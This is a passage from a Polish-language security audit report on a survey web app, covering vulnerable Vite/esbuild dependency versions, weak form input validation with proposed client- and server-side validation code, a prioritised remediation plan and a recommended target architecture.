### CVE w package.json
**Źródło:** `pnpm audit`
**Poziom:** **3x MODERATE, 2x LOW**

#### Znalezione podatności:

| CVE | Pakiet | Wersja | Poziom | Opis | Naprawa |
|-----|--------|--------|--------|------|---------|
| GHSA-67mh-4wv8-2f99 | esbuild | 0.21.5 | **MODERATE** | CORS bypass w dev server - dowolna strona może wysyłać żądania do dev servera | Aktualizacja do esbuild >= 0.25.0 (poprzez aktualizację Vite) |
| GHSA-g4jq-h2w9-997c<br>CVE-2025-58751 | vite | 6.3.5 | **LOW** | Bypass server.fs settings gdy public dir zawiera symlink | Aktualizacja do Vite >= 6.3.6 |
| GHSA-jqfw-vq24-v9c3<br>CVE-2025-58752 | vite | 6.3.5 | **LOW** | Pliki HTML serwowane mimo server.fs.deny | Aktualizacja do Vite >= 6.3.6 |
| GHSA-93m4-6634-74q7<br>CVE-2025-62522 | vite | 6.3.5 | **MODERATE** | Bypass server.fs.deny poprzez backslash na Windows | Aktualizacja do Vite >= 6.4.1 |
| GHSA-93m4-6634-74q7<br>CVE-2025-62522 | vite (via vitest) | 5.4.20 | **MODERATE** | Bypass server.fs.deny poprzez backslash na Windows | Aktualizacja vitest (pociągnie nowszą wersję Vite) |

**Sugerowana naprawa:**
```bash
# 1. Aktualizacja Vite
pnpm update vite@latest

# 2. Aktualizacja vitest (która pociągnie nowszą wersję Vite)
pnpm update vitest@latest

# 3. Weryfikacja
pnpm audit

# 4. Aktualizacja package.json
```

```json
{
  "devDependencies": {
    "jsdom": "^27.1.0",
    "vite": "^6.4.1",
    "vitest": "^2.0.0"
  },
  "dependencies": {
    "three": "^0.170.0"
  }
}
```

**UWAGA o esbuild GHSA-67mh-4wv8-2f99:**
Ta podatność dotyczy tylko developmentu (`npm run dev`). W produkcji (po build) nie ma wpływu na bezpieczeństwo. Jednak i tak zalecana jest aktualizacja.

**Priorytet:** **P1 - Wysoki**

---

## ✅ Walidacja Danych Wejściowych

### 5.1 Słaba walidacja formularzy
**Lokalizacja:** `employee-survey.js:67-75`, `granulate-survey.js:96-111`
**Poziom:** **ŚREDNI**

**Problem:**
Walidacja ogranicza się tylko do sprawdzenia czy pole jest wypełnione. Brak:
- Walidacji długości
- Walidacji formatów (email, telefon)
- Sanityzacji znaków specjalnych
- Walidacji typów danych
- Walidacji zakresów wartości

**Fragment kodu:**
```javascript
// employee-survey.js:67-75
// Validate required field
if (!response.teamContinuation) {
    showEmployeeValidationError('Selecteer een antwoord op de eerste vraag');
    // ...
    return;
}
// Tylko sprawdzanie czy pole istnieje - BRAK sanityzacji!
```

**Dane bez walidacji:**
```javascript
// employee-survey.js:54-65
const response = {
    timestamp: new Date().toISOString(),
    sessionToken: generateSessionToken(),
    name: formData.get('name') || 'Anonim', // Brak walidacji długości, znaków
    teamContinuation: formData.get('team-continuation'), // OK - radio button
    daremonFeatures: formData.getAll('daremon-features'), // OK - checkboxy
    newFeatures: formData.getAll('new-features'), // OK - checkboxy
    newFeaturesOther: formData.get('new-features-other') || '', // Brak walidacji!
    helpAreas: formData.getAll('help-areas'), // OK - checkboxy
    ideas: formData.get('ideas') || '' // Brak walidacji długości, contentu!
};
```

**Sugerowana naprawa:**
```javascript
// validation.js - Nowy moduł walidacji
class Validator {
    static sanitizeText(text, maxLength = 500) {
        if (!text) return '';

        // Trim whitespace
        let sanitized = text.trim();

        // Ogranicz długość
        if (sanitized.length > maxLength) {
            sanitized = sanitized.substring(0, maxLength);
        }

        // Usuń potencjalnie niebezpieczne znaki (opcjonalne)
        // sanitized = sanitized.replace(/[<>]/g, ''); // Usuwanie < i >

        return sanitized;
    }

    static validateName(name) {
        const sanitized = this.sanitizeText(name, 100);

        if (sanitized.length === 0) {
            return { valid: false, error: 'Imię nie może być puste' };
        }

        if (sanitized.length < 2) {
            return { valid: false, error: 'Imię musi mieć co najmniej 2 znaki' };
        }

        // Opcjonalnie: sprawdzenie czy zawiera tylko litery
        const nameRegex = /^[a-zA-ZąćęłńóśźżĄĆĘŁŃÓŚŹŻ\s\-']+$/;
        if (!nameRegex.test(sanitized)) {
            return { valid: false, error: 'Imię zawiera niedozwolone znaki' };
        }

        return { valid: true, value: sanitized };
    }

    static validateTextArea(text, minLength = 0, maxLength = 1000) {
        const sanitized = this.sanitizeText(text, maxLength);

        if (minLength > 0 && sanitized.length < minLength) {
            return { valid: false, error: `Tekst musi mieć co najmniej ${minLength} znaków` };
        }

        return { valid: true, value: sanitized };
    }

    static validateEmail(email) {
        const sanitized = this.sanitizeText(email, 255);

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(sanitized)) {
            return { valid: false, error: 'Nieprawidłowy format email' };
        }

        return { valid: true, value: sanitized.toLowerCase() };
    }

    static validateSelect(value, allowedValues) {
        if (!allowedValues.includes(value)) {
            return { valid: false, error: 'Nieprawidłowa wartość' };
        }

        return { valid: true, value };
    }
}

// Użycie w employee-survey.js
function handleEmployeeSurveySubmit(event) {
    event.preventDefault();
    const formData = new FormData(event.target);

    // Walidacja z użyciem Validator
    const validations = {
        name: Validator.validateName(formData.get('name') || 'Anonim'),
        teamContinuation: Validator.validateSelect(
            formData.get('team-continuation'),
            ['yes', 'maybe', 'no']
        ),
        newFeaturesOther: Validator.validateTextArea(
            formData.get('new-features-other') || '',
            0,
            500
        ),
        ideas: Validator.validateTextArea(
            formData.get('ideas') || '',
            0,
            1000
        )
    };

    // Sprawdzenie błędów
    const errors = [];
    for (const [field, result] of Object.entries(validations)) {
        if (!result.valid) {
            errors.push(`${field}: ${result.error}`);
        }
    }

    if (errors.length > 0) {
        showEmployeeValidationError(errors.join('\n'));
        return;
    }

    // Budowanie odpowiedzi z walidowanymi danymi
    const response = {
        timestamp: new Date().toISOString(),
        sessionToken: generateSessionToken(),
        name: validations.name.value,
        teamContinuation: validations.teamContinuation.value,
        daremonFeatures: formData.getAll('daremon-features'), // Checkboxy - OK
        newFeatures: formData.getAll('new-features'), // Checkboxy - OK
        newFeaturesOther: validations.newFeaturesOther.value,
        helpAreas: formData.getAll('help-areas'), // Checkboxy - OK
        ideas: validations.ideas.value
    };

    // Kontynuacja wysyłki...
    submitSurveyToBackend(response);
}

// W HTML - dodanie atrybutów walidacji
<input
    type="text"
    name="name"
    maxlength="100"
    pattern="[a-zA-ZąćęłńóśźżĄĆĘŁŃÓŚŹŻ\s\-']+"
    required
>

<textarea
    name="ideas"
    maxlength="1000"
    placeholder="Twoje pomysły (max 1000 znaków)"
></textarea>
```

**Priorytet:** **P2 - Średni**

---

### 5.2 Brak walidacji backend-side (gdy backend włączony)
**Lokalizacja:** Backend API (obecnie nieimplementowany)
**Poziom:** **ŚREDNI**

**Problem:**
Gdy backend zostanie włączony (`enableBackend: true`), brak będzie walidacji po stronie serwera. Walidacja tylko po stronie klienta jest niewystarczająca - atakujący może ominąć ją całkowicie.

**Sugerowana naprawa (Node.js + Express):**
```javascript
// Backend - routes/surveys.js
const express = require('express');
const router = express.Router();
const { body, validationResult } = require('express-validator');

// Middleware walidacji dla employee survey
const validateEmployeeSurvey = [
    body('name')
        .trim()
        .isLength({ min: 2, max: 100 })
        .withMessage('Name must be 2-100 characters')
        .matches(/^[a-zA-ZąćęłńóśźżĄĆĘŁŃÓŚŹŻ\s\-']+$/)
        .withMessage('Name contains invalid characters'),

    body('teamContinuation')
        .isIn(['yes', 'maybe', 'no'])
        .withMessage('Invalid team continuation value'),

    body('daremonFeatures')
        .optional()
        .isArray()
        .withMessage('Daremon features must be an array'),

    body('daremonFeatures.*')
        .isIn(['radio', 'visualizer', 'surveys', 'messaging', 'themes', 'ratings'])
        .withMessage('Invalid feature value'),

    body('ideas')
        .optional()
        .trim()
        .isLength({ max: 1000 })
        .withMessage('Ideas must be max 1000 characters'),

    body('newFeaturesOther')
        .optional()
        .trim()
        .isLength({ max: 500 })
        .withMessage('Other features must be max 500 characters')
];

// Endpoint z walidacją
router.post('/surveys/employee',
    authenticateToken, // Middleware uwierzytelniania
    validateEmployeeSurvey, // Middleware walidacji
    async (req, res) => {
        // Sprawdzenie błędów walidacji
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({
                error: 'Validation failed',
                details: errors.array() // W dev, w prod usunąć details
            });
        }

        // Dane są walidowane - można bezpiecznie zapisać
        const surveyData = {
            userId: req.user.id, // Z JWT
            name: req.body.name,
            teamContinuation: req.body.teamContinuation,
            daremonFeatures: req.body.daremonFeatures || [],
            newFeatures: req.body.newFeatures || [],
            newFeaturesOther: req.body.newFeaturesOther || '',
            helpAreas: req.body.helpAreas || [],
            ideas: req.body.ideas || '',
            timestamp: new Date(),
            ipAddress: req.ip // Opcjonalnie: tracking IP
        };

        try {
            await db.surveys.insert(surveyData);
            res.json({ success: true, message: 'Survey saved' });
        } catch (error) {
            logger.error('Failed to save survey:', error);
            res.status(500).json({ error: 'Failed to save survey' });
        }
    }
);

module.exports = router;
```

**Priorytet:** **P2 - Średni** (gdy backend zostanie włączony)

---

## 📋 Lista Priorytetów Refaktoryzacji Bezpieczeństwa

### Priorytety naprawy (od najbardziej krytycznych):

#### 🔴 **P0 - Krytyczny (Natychmiastowe działanie wymagane)**

1. **Implementacja systemu uwierzytelniania i autoryzacji**
   - Czas: 2-3 tygodnie
   - Wysiłek: Wysoki
   - Wpływ: Krytyczny
   - **Działanie:** Wybór między OAuth2 (zalecane) a własnym systemem JWT

2. **Usunięcie 'unsafe-inline' z CSP**
   - Czas: 1 tydzień
   - Wysiłek: Średni
   - Wpływ: Krytyczny
   - **Działanie:** Przeniesienie inline scripts/styles do plików zewnętrznych lub implementacja nonces

3. **Szyfrowanie danych w localStorage lub przeniesienie na backend**
   - Czas: 1-2 tygodnie
   - Wysiłek: Średni-Wysoki
   - Wpływ: Krytyczny
   - **Działanie:** Web Crypto API lub migracja na backend z bazą danych

4. **Implementacja backend z CSRF tokens (wymaga backendu)**
   - Czas: 2 tygodnie
   - Wysiłek: Wysoki
   - Wpływ: Krytyczny
   - **Działanie:** Backend Node.js/Python z generowaniem tokenów CSRF

5. **Dodanie kontroli dostępu do wyników ankiet**
   - Czas: 3 dni (zależy od #1)
   - Wysiłek: Niski-Średni
   - Wpływ: Krytyczny
   - **Działanie:** Sprawdzanie uprawnień przed wyświetleniem danych

---

#### 🟠 **P1 - Wysoki (W ciągu 1-2 tygodni)**

6. **Wymuszenie HTTPS i włączenie HSTS**
   - Czas: 1 dzień
   - Wysiłek: Niski
   - Wpływ: Wysoki
   - **Działanie:** Odkomentowanie w .htaccess, konfiguracja serwera

7. **Aktualizacja Vite i vitest (CVE)**
   - Czas: 1 dzień
   - Wysiłek: Niski
   - Wpływ: Wysoki
   - **Działanie:** `pnpm update vite@latest vitest@latest`

8. **Usunięcie/warunkowe logowanie console.log w produkcji**
   - Czas: 2 dni
   - Wysiłek: Niski
   - Wpływ: Wysoki
   - **Działanie:** Implementacja klasy Logger + konfiguracja Vite esbuild.drop

9. **Naprawa XSS poprzez innerHTML**
   - Czas: 3 dni
   - Wysiłek: Średni
   - Wpływ: Wysoki
   - **Działanie:** Zastąpienie innerHTML na textContent lub implementacja DOMPurify

---

#### 🟡 **P2 - Średni (W ciągu 1 miesiąca)**

10. **Implementacja kompletnej walidacji inputu**
    - Czas: 1 tydzień
    - Wysiłek: Średni
    - Wpływ: Średni
    - **Działanie:** Klasa Validator + regex patterns

11. **Implementacja rate limiting (backend)**
    - Czas: 3 dni
    - Wysiłek: Średni
    - Wpływ: Średni
    - **Działanie:** Express-rate-limit lub podobne

12. **Generyczne komunikaty błędów HTTP dla użytkowników**
    - Czas: 1 dzień
    - Wysiłek: Niski
    - Wpływ: Średni
    - **Działanie:** Mapowanie kodów HTTP na user-friendly messages

13. **Konsekwentne użycie escapeHtml we wszystkich miejscach**
    - Czas: 2 dni
    - Wysiłek: Niski
    - Wpływ: Średni
    - **Działanie:** Audit + refactoring

14. **Walidacja backend-side (gdy backend włączony)**
    - Czas: 1 tydzień
    - Wysiłek: Średni
    - Wpływ: Średni
    - **Działanie:** Express-validator + middleware

15. **Dodanie maxlength i pattern do inputów HTML**
    - Czas: 1 dzień
    - Wysiłek: Niski
    - Wpływ: Średni
    - **Działanie:** Modyfikacja HTML forms

---

#### 🟢 **P3 - Niski (Nice to have)**

16. **Subresource Integrity (SRI) dla CDN**
    - Czas: 1 godzina
    - Wysiłek: Niski
    - Wpływ: Niski
    - **Działanie:** Dodanie integrity attributes do <script> i <link>

17. **Dodatkowe security headers (X-Download-Options, Expect-CT)**
    - Czas: 30 minut
    - Wysiłek: Niski
    - Wpływ: Niski
    - **Działanie:** Modyfikacja .htaccess

18. **Ograniczenie img-src w CSP do konkretnych domen**
    - Czas: 1 godzina
    - Wysiłek: Niski
    - Wpływ: Niski
    - **Działanie:** Audit źródeł obrazków + update CSP

19. **Walidacja URL parameters**
    - Czas: 2 dni
    - Wysiłek: Niski
    - Wpływ: Niski
    - **Działanie:** Dodanie walidacji do routingu

---

## 📊 Podsumowanie Statystyk

### Znalezione problemy według kategorii:

| Kategoria OWASP | Liczba problemów | Poziom krytyczności |
|-----------------|------------------|---------------------|
| A01 - Broken Access Control | 5 | 🔴 KRYTYCZNY |
| A02 - Cryptographic Failures | 3 | 🔴 KRYTYCZNY |
| A03 - Injection (XSS) | 2 | 🟠 WYSOKI |
| A07 - Authentication Failures | 1 | 🔴 KRYTYCZNY |
| Obsługa błędów | 3 | 🟠 WYSOKI |
| Walidacja inputu | 4 | 🟡 ŚREDNI |
| Dependencies (CVE) | 5 | 🟠 WYSOKI |
| Inne | 2 | 🟢 NISKI |

### Oszacowanie czasu naprawy:

| Priorytet | Liczba zadań | Szacowany czas | Wymagany backend |
|-----------|--------------|----------------|------------------|
| P0 - Krytyczny | 5 | 6-8 tygodni | TAK (4/5) |
| P1 - Wysoki | 4 | 1-2 tygodnie | NIE |
| P2 - Średni | 6 | 3-4 tygodnie | TAK (2/6) |
| P3 - Niski | 4 | 1 tydzień | NIE |
| **TOTAL** | **19** | **~12-15 tygodni** | **Backend required** |

---

## 🎯 Zalecenia Końcowe

### 1. **Natychmiastowe działania (najbliższe 2 tygodnie):**
- ✅ Aktualizacja Vite i vitest do najnowszych wersji
- ✅ Wymuszenie HTTPS i włączenie HSTS
- ✅ Usunięcie console.log w produkcji
- ✅ Rozpoczęcie planowania systemu uwierzytelniania

### 2. **Krótkoterminowe (1-2 miesiące):**
- ✅ Implementacja OAuth2/JWT authentication
- ✅ Usunięcie 'unsafe-inline' z CSP
- ✅ Naprawa XSS poprzez innerHTML
- ✅ Implementacja backendu dla CSRF tokens

### 3. **Długoterminowe (3-6 miesięcy):**
- ✅ Migracja danych z localStorage na backend
- ✅ Kompletna walidacja inputu (frontend + backend)
- ✅ Rate limiting i monitoring
- ✅ Error tracking (Sentry/LogRocket)

### 4. **Architektura docelowa (zalecana):**

```
┌─────────────────────────────────────────────────────────────┐
│                    FRONTEND (PWA)                           │
│  ┌────────────────────────────────────────────────────┐    │
│  │  • OAuth2 Login (Azure AD / Okta / Auth0)          │    │
│  │  • JWT Token Management                            │    │
│  │  • CSP bez 'unsafe-inline' (nonces)                │    │
│  │  • Input validation (client-side UX)               │    │
│  │  • Secure storage (encrypted/sessionStorage)       │    │
│  └────────────────────────────────────────────────────┘    │
└────────────────────────┬────────────────────────────────────┘
                         │ HTTPS + HSTS
                         ▼
┌─────────────────────────────────────────────────────────────┐
│                    BACKEND API (Node.js)                    │
│  ┌────────────────────────────────────────────────────┐    │
│  │  • JWT Verification Middleware                     │    │
│  │  • CSRF Token Generation & Validation             │    │
│  │  • Rate Limiting (express-rate-limit)              │    │
│  │  • Input Validation (express-validator)            │    │
│  │  • Role-Based Access Control (RBAC)               │    │
│  │  • Error Handling (no stack traces)                │    │
│  │  • Security Headers (helmet.js)                    │    │
│  └────────────────────────────────────────────────────┘    │
└────────────────────────┬────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────┐
│                 DATABASE (PostgreSQL/MongoDB)               │
│  • Encrypted at rest                                        │
│  • User data isolation                                      │
│  • Audit logs                                               │
│  • Backups                                                  │
└─────────────────────────────────────────────────────────────┘
```

---

## 📞 Kontakt i Wsparcie

W przypadku pytań dotyczących tego raportu lub pomocy w implementacji zaleceń:
- **Security Team:** security@daremon.nl
- **Development Team:** dev@daremon.nl

---

**Koniec raportu**
**Wygenerowano:** 2025-11-14
**Wersja:** 1.0
**Narzędzie:** Claude Code Security Audit
